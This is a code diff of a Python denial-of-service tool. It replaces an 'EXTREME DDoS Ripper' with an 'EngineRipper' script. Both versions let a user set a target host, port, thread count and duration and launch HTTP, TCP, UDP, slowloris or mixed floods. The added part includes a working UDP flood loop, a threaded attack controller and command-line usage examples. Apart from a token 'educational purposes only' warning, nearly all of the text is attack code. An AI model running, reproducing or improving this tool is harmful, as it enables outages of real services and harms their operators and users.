-    
-    def set_target(self):
-        self.print_header("🎯 SET TARGET")
-        print(f"\n{Colors.WHITE}Enter the target for DESTRUCTION:{Colors.END}")
-        print(f"{Colors.YELLOW}Examples:{Colors.END}")
-        print(f"  {Colors.GREEN}192.168.1.100{Colors.END}")
-        print(f"  {Colors.GREEN}example.com{Colors.END}")
-        print(f"  {Colors.GREEN}target.org{Colors.END}\n")
-        
-        target = self.get_input("🎯 Target IP/Domain", Colors.WHITE, self.target)
-        if target:
-            self.target = target
-            print(f"\n{Colors.GREEN}✅ Target set to: {self.target}{Colors.END}")
-        else:
-            print(f"\n{Colors.RED}❌ No target entered{Colors.END}")
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
-    
-    def set_port(self):
-        self.print_header("🔌 SET PORT")
-        print(f"\n{Colors.WHITE}Enter the target port:{Colors.END}")
-        print(f"{Colors.YELLOW}Common ports:{Colors.END}")
-        print(f"  {Colors.GREEN}80{Colors.END}   - HTTP")
-        print(f"  {Colors.GREEN}443{Colors.END}  - HTTPS")
-        print(f"  {Colors.GREEN}22{Colors.END}   - SSH")
-        print(f"  {Colors.GREEN}53{Colors.END}   - DNS")
-        print(f"  {Colors.GREEN}21{Colors.END}   - FTP\n")
-        
-        try:
-            port = self.get_input("🔌 Port", Colors.WHITE, str(self.port))
-            self.port = int(port)
-            if 1 <= self.port <= 65535:
-                print(f"\n{Colors.GREEN}✅ Port set to: {self.port}{Colors.END}")
-            else:
-                print(f"\n{Colors.RED}❌ Invalid port number{Colors.END}")
-                self.port = 80
-        except ValueError:
-            print(f"\n{Colors.RED}❌ Invalid port number{Colors.END}")
-        
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
-    
-    def set_threads(self):
-        self.print_header("🚀 SET THREADS")
-        print(f"\n{Colors.WHITE}Set the number of attack threads:{Colors.END}")
-        print(f"{Colors.YELLOW}Power Levels:{Colors.END}")
-        print(f"  {Colors.GREEN}100-500{Colors.END}   - Normal Power")
-        print(f"  {Colors.YELLOW}500-1000{Colors.END}  - High Power") 
-        print(f"  {Colors.RED}1000-2000{Colors.END} - EXTREME Power")
-        print(f"  {Colors.PURPLE}2000-5000{Colors.END} - MAXIMUM DESTRUCTION\n")
-        
-        try:
-            threads = self.get_input("🚀 Threads", Colors.WHITE, str(self.threads))
-            self.threads = int(threads)
-            if self.threads > 10000:
-                print(f"\n{Colors.RED}⚠️ Warning: Reducing threads to 10000 for system stability{Colors.END}")
-                self.threads = 10000
-            print(f"\n{Colors.GREEN}✅ Threads set to: {self.threads}{Colors.END}")
-        except ValueError:
-            print(f"\n{Colors.RED}❌ Invalid number{Colors.END}")
-        
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
-    
-    def set_duration(self):
-        self.print_header("⏱️ SET ATTACK DURATION")
-        print(f"\n{Colors.WHITE}Set attack duration in seconds:{Colors.END}")
-        print(f"{Colors.YELLOW}Duration Levels:{Colors.END}")
-        print(f"  {Colors.GREEN}30{Colors.END}     - Quick Test")
-        print(f"  {Colors.YELLOW}60{Colors.END}     - Standard Attack")
-        print(f"  {Colors.RED}300{Colors.END}    - Extended Attack")
-        print(f"  {Colors.PURPLE}1800{Colors.END}   - MAXIMUM DESTRUCTION\n")
-        
-        try:
-            duration = self.get_input("⏱️ Duration (seconds)", Colors.WHITE, str(self.duration))
-            self.duration = int(duration)
-            print(f"\n{Colors.GREEN}✅ Duration set to: {self.duration} seconds{Colors.END}")
-        except ValueError:
-            print(f"\n{Colors.RED}❌ Invalid duration{Colors.END}")
-        
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
-    
-    def set_attack_type(self):
-        self.print_header("💥 SELECT ATTACK TYPE")
-        print(f"\n{Colors.WHITE}Choose your DESTRUCTION method:{Colors.END}\n")
-        
-        attacks = {
-            '1': ('http', '🚀 HTTP Flood - Maximum RPS'),
-            '2': ('tcp', '💥 TCP Flood - Raw Power'),
-            '3': ('udp', '🔥 UDP Flood - Connectionless Destruction'), 
-            '4': ('slowloris', '🔗 Slowloris - Connection Exhaustion'),
-            '5': ('mixed', '⚡ Mixed Attack - ALL METHODS COMBINED')
-        }
-        
-        for key, (attack, description) in attacks.items():
-            current = " ✅" if self.attack_type == attack else ""
-            print(f"  {Colors.GREEN}[{key}]{Colors.END} {attack.upper():<12} - {description}{current}")
-        
-        choice = self.get_input(f"\n{Colors.YELLOW}💥 Select attack type", Colors.WHITE)
-        
-        if choice in attacks:
-            self.attack_type = attacks[choice][0]
-            print(f"\n{Colors.GREEN}✅ Attack type set to: {self.attack_type.upper()}{Colors.END}")
-        else:
-            print(f"\n{Colors.RED}❌ Invalid selection{Colors.END}")
-        
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
-    
-    def quick_start(self):
-        self.print_header("⚡ QUICK START - MAXIMUM DESTRUCTION")
-        print(f"\n{Colors.WHITE}Quick start will use MAXIMUM power settings:{Colors.END}\n")
-        
-        defaults = {
-            '🎯 Target': 'example.com',
-            '🔌 Port': '80',
-            '🚀 Threads': '1000', 
-            '⏱️ Duration': '120',
-            '💥 Attack Type': 'MIXED EXTREME'
-        }
-        
-        for key, value in defaults.items():
-            print(f"  {Colors.WHITE}{key}:{Colors.END} {Colors.RED}{value}{Colors.END}")
-        
-        confirm = self.get_input(f"\n{Colors.YELLOW}🚀 Use MAXIMUM power settings? (y/N)", Colors.WHITE).lower()
-        
-        if confirm in ['y', 'yes']:
-            self.target = "example.com"
-            self.port = 80
-            self.threads = 1000
-            self.duration = 120
-            self.attack_type = "mixed"
-            self.auto_start = True
-            print(f"\n{Colors.GREEN}✅ MAXIMUM POWER CONFIGURED!{Colors.END}")
-        else:
-            print(f"\n{Colors.YELLOW}Quick start cancelled{Colors.END}")
-        
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")
-    
-    def validate_configuration(self):
-        if not self.target:
-            print(f"\n{Colors.RED}❌ Error: Target not set!{Colors.END}")
-            return False
-        
-        if self.port < 1 or self.port > 65535:
-            print(f"\n{Colors.RED}❌ Error: Invalid port number!{Colors.END}")
-            return False
-        
-        if self.threads < 1:
-            print(f"\n{Colors.RED}❌ Error: Invalid thread count!{Colors.END}")
-            return False
-        
-        if self.duration < 1:
-            print(f"\n{Colors.RED}❌ Error: Invalid duration!{Colors.END}")
-            return False
-        
-        return True
-    
-    def show_attack_summary(self):
-        self.clear_screen()
-        self.print_header("🔥 ATTACK SUMMARY - READY FOR DESTRUCTION")
-        
-        print(f"\n{Colors.WHITE}Attack Configuration:{Colors.END}\n")
-        print(f"  {Colors.WHITE}🎯 Target:{Colors.END} {Colors.RED}{self.target}{Colors.END}")
-        print(f"  {Colors.WHITE}🔌 Port:{Colors.END} {Colors.RED}{self.port}{Colors.END}")
-        print(f"  {Colors.WHITE}🚀 Threads:{Colors.END} {Colors.RED}{self.threads}{Colors.END}")
-        print(f"  {Colors.WHITE}⏱️ Duration:{Colors.END} {Colors.RED}{self.duration} seconds{Colors.END}")
-        print(f"  {Colors.WHITE}💥 Attack Type:{Colors.END} {Colors.RED}{self.attack_type.upper()}{Colors.END}")
-        
-        print(f"\n{Colors.YELLOW}{Colors.BLINK}⚠️  LEGAL WARNING:{Colors.END}")
-        print(f"{Colors.WHITE}This tool is for educational purposes only.{Colors.END}")
-        print(f"{Colors.WHITE}Only use on systems you own or have explicit permission to test.{Colors.END}")
-        
-        confirm = self.get_input(f"\n{Colors.RED}{Colors.BLINK}🔥 START EXTREME ATTACK? (y/N){Colors.END}", Colors.WHITE).lower()
-        return confirm in ['y', 'yes']
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                payload_size = random.choice([512, 1024, 2048, 4096])
+                payload = self.generate_payload(payload_size)
+                
+                s.sendto(payload, (host, port))
+                self.stats['packets_sent'] += 1
+                
+                with self.print_lock:
+                    print(f"{Color.BLUE}udp packet sent! rippering...{Color.END}")
+                
+                s.close()
+                error_count = 0
+                time.sleep(0.001)
+                
+            except Exception as e:
+                error_count += 1
+                self.handle_error('unknown', f"UDP send failed: {e}", thread_id)
+                time.sleep(0.1)
 
-# EXTREME ATTACK MANAGER WITH PACKET SPAM
-class ExtremeAttackManager:
-    def __init__(self, target, port, threads=500, duration=60, attack_type="http"):
-        self.target = target
-        self.port = port
-        self.threads = min(threads, 10000)  # Increased limit
-        self.duration = duration
-        self.attack_type = attack_type
-        self.attack_vectors = ExtremeAttackVectors(target, port)
-        self.stats = {
-            'requests_sent': 0,
-            'successful_connections': 0,
-            'failed_connections': 0,
-            'start_time': time.time(),
-            'last_rps_check': time.time(),
-            'last_rps_count': 0
+    def start_attack(self, host, port, threads, attack_type, duration=None):
+        """Main attack controller with server validation"""
+        self.display_banner()
+        
+        # First, validate server connection
+        print(f"{Color.YELLOW}[VALIDATION]{Color.END} Checking target server...")
+        server_online, checks = self.server_checker.check_server_online(host, port)
+        
+        if not server_online:
+            print(f"\n{Color.RED}[ERROR]{Color.END} Server validation failed!")
+            self.server_checker.diagnose_connection_issues(host, port, checks)
+            print(f"\n{Color.YELLOW}[SUGGESTION]{Color.END} Please verify:")
+            print(f"  - Target server is running and accessible")
+            print(f"  - Port {port} is open and service is listening")
+            print(f"  - Hostname/IP address is correct")
+            print(f"  - Network connectivity is available")
+            return False
+        
+        print(f"\n{Color.GREEN}[VALIDATION SUCCESS]{Color.END} Server is reachable and ready!")
+        print(f"{Color.YELLOW}[INFO]{Color.END} Starting {attack_type} attack on {host}:{port}")
+        print(f"{Color.YELLOW}[INFO]{Color.END} Threads: {threads} | Duration: {duration or 'Unlimited'}")
+        print(f"{Color.RED}[WARNING]{Color.END} Maximum aggression mode activated!")
+        
+        # Select attack method
+        attack_methods = {
+            "tcp_flood": self.down_it,
+            "http_flood": self.http_flood_attack,
+            "udp_flood": self.udp_flood_attack,
+            "bot_attack": lambda host, port, tid: self.bot_rippering(f"http://{host}", tid),
+            "mixed": self.down_it  # Default to TCP flood for mixed
         }
-        self.is_running = False
-        self.total_rps = 0
-        self.rps_samples = []
-    
-    def start_attack(self):
-        print(f"\n{Colors.RED}{Colors.BLINK}🔥 STARTING EXTREME {self.attack_type.upper()} ATTACK ON {self.target}:{self.port}{Colors.END}")
-        print(f"{Colors.RED}🚀 USING {self.threads} THREADS FOR {self.duration} SECONDS{Colors.END}")
-        print(f"{Colors.YELLOW}💀 PRESS CTRL+C TO STOP THE DESTRUCTION{Colors.END}")
         
-        self.is_running = True
-        threads = []
+        if attack_type not in attack_methods:
+            print(f"{Color.RED}[ERROR]{Color.END} Unknown attack type: {attack_type}")
+            return False
         
-        # Start massive attack threads
-        for i in range(self.threads):
-            if self.attack_type == "http":
-                thread = threading.Thread(target=self.attack_vectors.http_flood_extreme, args=(self.duration,))
-            elif self.attack_type == "tcp":
-                thread = threading.Thread(target=self.attack_vectors.tcp_flood_extreme, args=(self.duration,))
-            elif self.attack_type == "udp":
-                thread = threading.Thread(target=self.attack_vectors.udp_flood_extreme, args=(self.duration,))
-            elif self.attack_type == "slowloris":
-                thread = threading.Thread(target=self.attack_vectors.slowloris_extreme, args=(self.duration, 200))
-            elif self.attack_type == "mixed":
-                thread = threading.Thread(target=self.attack_vectors.mixed_extreme_attack, args=(self.duration,))
-            else:
-                thread = threading.Thread(target=self.attack_vectors.http_flood_extreme, args=(self.duration,))
-            
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-        
-        # Monitor attack with PACKET SPAM
-        try:
-            self.monitor_attack_with_spam()
-        except KeyboardInterrupt:
-            print(f"\n{Colors.RED}{Colors.BLINK}💀 ATTACK INTERRUPTED BY USER{Colors.END}")
-            self.is_running = False
-        
-        # Wait for completion
-        for thread in threads:
-            thread.join(timeout=1)
-    
-    def monitor_attack_with_spam(self):
-        """Monitor attack with PACKET SPAM messages"""
+        target_method = attack_methods[attack_type]
+
+        # Create and start threads
+        thread_pool = []
+        for i in range(threads):
+            try:
+                t = threading.Thread(
+                    target=target_method,
+                    args=(host, port, i),
+                    daemon=True
+                )
+                t.start()
+                thread_pool.append(t)
+            except Exception as e:
+                print(f"{Color.RED}[THREAD ERROR]{Color.END} Failed to start thread {i}: {e}")
+
+        print(f"{Color.GREEN}[SUCCESS]{Color.END} Attack launched with {len(thread_pool)}/{threads} threads!")
+        print(f"{Color.RED}[ATTACK ACTIVE]{Color.END} Press Ctrl+C to stop\n")
+
+        # Monitor attack
         start_time = time.time()
-        last_count = 0
-        
-        while time.time() - start_time < self.duration and self.is_running:
-            time.sleep(1)
-            elapsed = time.time() - start_time
-            stats = self.attack_vectors.get_stats()
-            
-            # Calculate RPS
-            current_count = stats['total_requests']
-            rps = current_count - last_count
-            last_count = current_count
-            
-            # Store RPS for average
-            self.rps_samples.append(rps)
-            
-            # PACKET SPAM MESSAGES
-            spam_messages = [
-                f"{Colors.GREEN}🚀 PACKET SEND RIPPERING {rps} RPS {Colors.END}",
-                f"{Colors.GREEN}💥 EXTREME PACKET FLOOD {rps} RPS {Colors.END}",
-                f"{Colors.GREEN}🔥 MAXIMUM DESTRUCTION {rps} RPS {Colors.END}",
-                f"{Colors.GREEN}⚡ TURBO RIPPER MODE {rps} RPS {Colors.END}",
-                f"{Colors.GREEN}🎯 TARGET DESTROYED {rps} RPS {Colors.END}"
-            ]
-            
-            print(random.choice(spam_messages))
-            
-            # Show stats every 5 seconds
-            if int(elapsed) % 5 == 0:
-                avg_rps = sum(self.rps_samples[-10:]) / min(10, len(self.rps_samples))
-                print(f"{Colors.CYAN}[STATS] Time: {elapsed:.1f}s | Current RPS: {rps} | Avg RPS: {avg_rps:.1f} | Total: {stats['total_requests']}{Colors.END}")
-    
-    def generate_extreme_report(self):
-        """Generate EXTREME attack report"""
-        duration = time.time() - self.stats['start_time']
-        stats = self.attack_vectors.get_stats()
-        
-        if self.rps_samples:
-            max_rps = max(self.rps_samples)
-            avg_rps = sum(self.rps_samples) / len(self.rps_samples)
-        else:
-            max_rps = avg_rps = 0
-        
-        print(f"\n{Colors.RED}{Colors.BLINK}{'='*80}{Colors.END}")
-        print(f"{Colors.YELLOW}{Colors.BOLD}{'💀 EXTREME ATTACK REPORT - MAXIMUM DESTRUCTION 💀':^80}{Colors.END}")
-        print(f"{Colors.RED}{Colors.BLINK}{'='*80}{Colors.END}")
-        print(f"{Colors.WHITE}🎯 Target:{Colors.END} {Colors.RED}{self.target}:{self.port}{Colors.END}")
-        print(f"{Colors.WHITE}💥 Attack Type:{Colors.END} {Colors.RED}{self.attack_type.upper()}{Colors.END}")
-        print(f"{Colors.WHITE}⏱️ Duration:{Colors.END} {Colors.GREEN}{duration:.2f} seconds{Colors.END}")
-        print(f"{Colors.WHITE}🚀 Total Packets:{Colors.END} {Colors.GREEN}{stats['total_requests']}{Colors.END}")
-        print(f"{Colors.WHITE}✅ Successful:{Colors.END} {Colors.GREEN}{stats['successful_requests']}{Colors.END}")
-        print(f"{Colors.WHITE}📊 Success Rate:{Colors.END} {Colors.GREEN}{stats['success_rate']:.2f}%{Colors.END}")
-        print(f"{Colors.WHITE}⚡ Average RPS:{Colors.END} {Colors.GREEN}{avg_rps:.1f}{Colors.END}")
-        print(f"{Colors.WHITE}🔥 Maximum RPS:{Colors.END} {Colors.GREEN}{max_rps}{Colors.END}")
-        print(f"{Colors.WHITE}💀 Total RPS:{Colors.END} {Colors.GREEN}{stats['total_requests']/duration:.1f}{Colors.END}")
-        
-        # Performance rating
-        performance = "MAXIMUM DESTRUCTION" if avg_rps > 1000 else "HIGH POWER" if avg_rps > 500 else "MEDIUM POWER"
-        performance_color = Colors.PURPLE if avg_rps > 1000 else Colors.RED if avg_rps > 500 else Colors.YELLOW
-        
-        print(f"{Colors.WHITE}🏆 Performance:{Colors.END} {performance_color}{performance}{Colors.END}")
-        print(f"{Colors.RED}{Colors.BLINK}{'='*80}{Colors.END}")
-
-# MAIN FUNCTION WITH CRAZY MENU
-def main():
-    # Check for root privileges
-    if os.geteuid() != 0:
-        print(f"{Colors.YELLOW}[!] Running without root privileges - some attacks may be limited{Colors.END}")
-        time.sleep(2)
-    
-    menu = ExtremeInteractiveMenu()
-    
-    while True:
-        choice = menu.show_main_menu()
-        
-        if choice == '1':
-            menu.set_target()
-        elif choice == '2':
-            menu.set_port()
-        elif choice == '3':
-            menu.set_threads()
-        elif choice == '4':
-            menu.set_duration()
-        elif choice == '5':
-            menu.set_attack_type()
-        elif choice == '6':
-            menu.quick_start()
-            if menu.auto_start and menu.validate_configuration():
-                if menu.show_attack_summary():
-                    break
-        elif choice == '7':
-            if menu.validate_configuration():
-                if menu.show_attack_summary():
-                    break
+        try:
+            if duration:
+                print(f"{Color.YELLOW}[TIMER]{Color.END} Attack will run for {duration} seconds")
+                for i in range(duration):
+                    if not self.running:
+                        break
+                    time.sleep(1)
+                    if i % 10 == 0:  # Print status every 10 seconds
+                        elapsed = time.time() - start_time
+                        print(f"{Color.CYAN}[STATUS]{Color.END} Running... {i}/{duration}s | "
+                              f"Packets: {self.stats['packets_sent']} | "
+                              f"Requests: {self.stats['requests_made']}")
+                self.stop_attack()
             else:
-                input(f"\n{Colors.RED}Press Enter to continue...{Colors.END}")
-        elif choice == '0':
-            print(f"\n{Colors.CYAN}Thanks for using EXTREME DDoS Ripper! Goodbye. 💀{Colors.END}")
-            sys.exit(0)
-        else:
-            print(f"\n{Colors.RED}Invalid option! Please try again.{Colors.END}")
-            time.sleep(1)
-    
-    # Start the EXTREME attack
-    try:
-        manager = ExtremeAttackManager(
-            target=menu.target,
-            port=menu.port,
-            threads=menu.threads,
-            duration=menu.duration,
-            attack_type=menu.attack_type
-        )
-        
-        manager.start_attack()
-        manager.generate_extreme_report()
-        
-    except KeyboardInterrupt:
-        print(f"\n{Colors.RED}{Colors.BLINK}💀 ATTACK INTERRUPTED BY USER{Colors.END}")
-    except Exception as e:
-        print(f"\n{Colors.RED}❌ Error during attack: {e}{Colors.END}")
-    
-    input(f"\n{Colors.CYAN}Press Enter to exit...{Colors.END}")
+                print(f"{Color.YELLOW}[INFO]{Color.END} Continuous attack mode - running until interrupted")
+                status_counter = 0
+                while self.running:
+                    time.sleep(1)
+                    status_counter += 1
+                    if status_counter % 15 == 0:  # Print status every 15 seconds
+                        elapsed = time.time() - start_time
+                        print(f"{Color.CYAN}[STATUS]{Color.END} Running for {elapsed:.1f}s | "
+                              f"Packets: {self.stats['packets_sent']} | "
+                              f"Requests: {self.stats['requests_made']} | "
+                              f"Errors: {self.stats['errors']}")
+                    
+        except KeyboardInterrupt:
+            print(f"\n{Color.YELLOW}[INFO]{Color.END} Attack interrupted by user")
+            self.stop_attack()
+        except Exception as e:
+            print(f"{Color.RED}[MONITOR ERROR]{Color.END} {e}")
+            self.stop_attack()
+            
+        return True
 
-# Legacy command-line support
-def legacy_main():
+    def stop_attack(self):
+        """Stop attack and display final statistics"""
+        self.running = False
+        print(f"\n{Color.RED}[INFO]{Color.END} Stopping attack engines...")
+        time.sleep(2)  # Allow threads to finish
+        
+        # Final statistics
+        duration = time.time() - self.stats['start_time']
+        total_requests = self.stats['packets_sent'] + self.stats['requests_made']
+        
+        print(f"\n{Color.CYAN}{Color.BOLD}=== ATTACK SUMMARY ==={Color.END}")
+        print(f"Total Duration: {duration:.2f} seconds")
+        print(f"Packets Sent: {self.stats['packets_sent']}")
+        print(f"HTTP Requests: {self.stats['requests_made']}")
+        print(f"Errors: {self.stats['errors']}")
+        
+        if duration > 0:
+            pps = self.stats['packets_sent'] / duration
+            rps = self.stats['requests_made'] / duration
+            print(f"Average PPS: {pps:.1f}")
+            print(f"Average RPS: {rps:.1f}")
+            print(f"Total Requests: {total_requests}")
+            print(f"Requests/Second: {total_requests/duration:.1f}")
+        
+        print(f"{Color.RED}[ATTACK COMPLETED]{Color.END}")
+
+def main():
     parser = OptionParser()
-    parser.add_option("-t", "--target", dest="target", help="Target IP address or hostname")
-    parser.add_option("-p", "--port", dest="port", type="int", default=80, help="Target port (default: 80)")
-    parser.add_option("-T", "--threads", dest="threads", type="int", default=500, help="Number of threads (default: 500)")
-    parser.add_option("-d", "--duration", dest="duration", type="int", default=60, help="Attack duration in seconds (default: 60)")
-    parser.add_option("-a", "--attack", dest="attack", default="http", 
-                     help="Attack type: http, tcp, udp, slowloris, mixed (default: http)")
+    parser.add_option("-s", "--host", dest="host", help="Target host/IP address")
+    parser.add_option("-p", "--port", type="int", dest="port", default=80, help="Target port (default: 80)")
+    parser.add_option("-t", "--threads", type="int", dest="threads", default=135, help="Number of threads (default: 135)")
+    parser.add_option("-d", "--duration", type="int", dest="duration", help="Attack duration in seconds")
+    parser.add_option("-m", "--method", dest="method", default="tcp_flood",
+                     help="Attack method: tcp_flood, http_flood, udp_flood, bot_attack, mixed")
     
     (options, args) = parser.parse_args()
     
-    if not options.target:
-        show_banner()
-        print(f"{Colors.RED}❌ Error: Target is required{Colors.END}")
-        print(f"\n{Colors.WHITE}Usage: python3 ddos_ripper.py -t <target> -p <port> -T <threads> -d <duration> -a <attack_type>{Colors.END}")
-        print(f"\n{Colors.YELLOW}Examples:{Colors.END}")
-        print(f"  {Colors.GREEN}python3 ddos_ripper.py -t 192.168.1.100 -p 80 -T 1000 -d 120 -a http{Colors.END}")
-        print(f"  {Colors.GREEN}python3 ddos_ripper.py -t example.com -p 443 -T 2000 -d 300 -a mixed{Colors.END}")
-        print(f"  {Colors.GREEN}python3 ddos_ripper.py -t 10.0.0.1 -p 22 -T 500 -d 60 -a tcp{Colors.END}")
-        print(f"\n{Colors.CYAN}Or run without arguments for CRAZY COLOR MENU!{Colors.END}")
+    if not options.host:
+        print(f"{Color.RED}[ERROR]{Color.END} Target host is required.")
+        print(f"{Color.YELLOW}[USAGE]{Color.END} python engineripper.py -s target.com -p 80 -t 200 -m mixed")
+        print(f"{Color.YELLOW}[EXAMPLES]{Color.END}")
+        print("  python engineripper.py -s 192.168.1.100 -p 80 -t 300 -m tcp_flood")
+        print("  python engineripper.py -s example.com -p 443 -t 150 -m http_flood -d 60")
+        print("  python engineripper.py -s target.com -p 8080 -t 400 -m mixed")
         sys.exit(1)
     
-    # Validate attack type
-    valid_attacks = ['http', 'tcp', 'udp', 'slowloris', 'mixed']
-    if options.attack not in valid_attacks:
-        print(f"{Colors.RED}❌ Invalid attack type. Choose from: {', '.join(valid_attacks)}{Colors.END}")
+    # Validate attack method
+    valid_methods = ['tcp_flood', 'http_flood', 'udp_flood', 'bot_attack', 'mixed']
+    if options.method not in valid_methods:
+        print(f"{Color.RED}[ERROR]{Color.END} Invalid attack method. Choose from: {', '.join(valid_methods)}")
         sys.exit(1)
     
-    # Start attack
-    manager = ExtremeAttackManager(
-        target=options.target,
-        port=options.port,
-        threads=options.threads,
-        duration=options.duration,
-        attack_type=options.attack
-    )
+    # Platform info
+    print(f"{Color.YELLOW}[PLATFORM]{Color.END} Running on {platform.system()} {platform.release()}")
     
+    # Create and start attack
+    ripper = EngineRipper()
     try:
-        manager.start_attack()
-        manager.generate_extreme_report()
+        success = ripper.start_attack(
+            host=options.host,
+            port=options.port,
+            threads=options.threads,
+            attack_type=options.method,
+            duration=options.duration
+        )
+        
+        if not success:
+            sys.exit(1)
+            
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}💀 Attack interrupted by user{Colors.END}")
+        print(f"\n{Color.YELLOW}[INFO]{Color.END} Script terminated by user")
     except Exception as e:
-        print(f"{Colors.RED}❌ Error during attack: {e}{Colors.END}")
+        print(f"{Color.RED}[FATAL ERROR]{Color.END} {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        legacy_main()
-    else:
-        main()
+    main()
